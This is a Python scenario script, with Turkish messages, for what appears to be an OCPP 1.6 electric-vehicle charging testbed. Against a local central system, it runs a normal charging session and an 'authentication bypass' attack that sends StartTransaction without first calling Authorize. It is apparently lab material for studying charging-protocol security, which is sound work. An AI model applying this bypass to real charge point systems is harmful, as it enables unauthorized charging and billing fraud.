import asyncio
import logging
import websockets
from .charge_point import SimulatedChargePoint

logging.basicConfig(level=logging.INFO)


async def normal_flow(cp: SimulatedChargePoint):
    print("🔵 NORMAL AKIŞ BAŞLADI")
    await cp.send_boot_notification()
    await cp.start_charging()

    for _ in range(5):
        await cp.simulate_meter_values()
        await asyncio.sleep(1)

    await cp.stop_charging()
    print("🔵 NORMAL AKIŞ BİTTİ")


async def attack_flow(cp: SimulatedChargePoint):
    cp.attack_mode = True

    print("😈 HACKER: Authentication Bypass başlatılıyor...")
    await asyncio.sleep(1)

    await cp.send_boot_notification()

    # ⭐ SALDIRI: Authorize atlanarak StartTransaction gönderiliyor
    print("🚀 SALDIRI: Yetki olmadan StartTransaction gönderiliyor!")
    await cp.start_charging()

    for _ in range(5):
        await cp.simulate_meter_values()
        await asyncio.sleep(1)

    print("⚠ SALDIRI: StopTransaction yine de gönderiliyor.")
    await cp.stop_charging()

    print("😈 AUTH BYPASS SALDIRISI TAMAMLANDI")


async def run_normal():
    uri = "ws://127.0.0.1:9000/CP_EMIN"
    async with websockets.connect(uri, subprotocols=["ocpp1.6"]) as ws:
        cp = SimulatedChargePoint("CP_EMIN", ws)
        await asyncio.gather(cp.start(), normal_flow(cp))


async def run_attack():
    uri = "ws://127.0.0.1:9000/CP_EMIN"
    async with websockets.connect(uri, subprotocols=["ocpp1.6"]) as ws:
        cp = SimulatedChargePoint("CP_EMIN", ws)
        await asyncio.gather(cp.start(), attack_flow(cp))


def run_scenario(mode: str = "normal"):
    if mode == "attack":
        logging.error("⚠ AUTH BYPASS: SALDIRI MODU BAŞLIYOR")
        asyncio.run(run_attack())
    else:
        logging.info("✔ AUTH BYPASS: NORMAL MOD BAŞLIYOR")
        asyncio.run(run_normal())
